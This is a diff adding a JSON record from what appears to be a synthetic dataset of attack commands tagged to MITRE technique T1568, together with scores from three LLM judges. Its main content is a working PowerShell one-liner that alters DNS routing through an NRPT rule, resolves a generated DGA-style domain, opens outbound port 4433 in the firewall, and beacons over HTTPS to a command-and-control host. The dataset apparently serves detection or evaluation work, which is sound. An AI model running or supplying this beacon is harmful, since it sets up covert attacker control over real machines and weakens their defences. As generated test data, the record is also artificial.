@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $ns='.telemetry-sync'; Add-DnsClientNrptRule -Namespace $ns -NameServers '9.9.9.9' -ErrorAction SilentlyContinue | Out-Null; Clear-DnsClientCache; $dom=('node{0}.c2{1}{2}' -f (Get-Random -Min 10 -Max 99),(Get-Date -Format 'MMdd'),$ns); $res=Resolve-DnsName $dom -Type A -ErrorAction SilentlyContinue; if($res){ netsh advfirewall firewall add rule name='out_4433' dir=out action=allow protocol=TCP remoteport=4433 | Out-Null; $ip=$res[0].IPAddress; if((Test-NetConnection -ComputerName $ip -Port 4433).TcpTestSucceeded){ Invoke-WebRequest -Uri ('https://{0}:4433/api' -f $dom) -Headers @{ Host=$dom; 'X-Req'=(Get-Random) } -TimeoutSec (Get-Random -Min 5 -Max 10) -UseBasicParsing } } }",
+  "explanation": "Adds an NRPT rule to route specific suffix queries to a custom resolver, resolves a DGA host, opens outbound 4433, verifies reachability, and then beacons.",
+  "rationale_steps": [
+    "Create an NRPT rule for selective DNS routing to an external resolver.",
+    "Generate and resolve a DGA domain under the controlled suffix.",
+    "Permit egress to a non-standard TLS port and verify connectivity.",
+    "Beacon over HTTPS using a Host header to maintain domain context."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-710592d1",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell is well-formed with balanced braces/quotes, valid cmdlets and parameters, and proper separators/pipelines.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates and resolves a domain and conditionally beacons, aligning with T1568, but NRPT and firewall changes generally require admin rights so those steps may fail under the stated non-privileged context.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T07:56:01.376675Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed PowerShell with balanced braces, parentheses, and quotes, valid cmdlet usage, proper string formatting operators, and correct semicolon separators throughout the script block.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1568 dynamic resolution by constructing a DGA-style domain using random numbers and date-based components, routing it through a custom DNS resolver via NRPT, clearing cache to avoid stale results, opening a firewall rule for port 4433, verifying TCP reachability, and beaconing with randomized headers and timing — all operationally coherent and realistic C2 behaviors.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:31:21.540995Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly formed with correct cmdlet usage, valid string formatting, and balanced delimiters.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately demonstrates dynamic resolution (DGA-like domain generation) and NRPT manipulation, though it requires administrative privileges which contradicts the 'None' privilege level provided in the metadata.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T00:31:26.253024Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
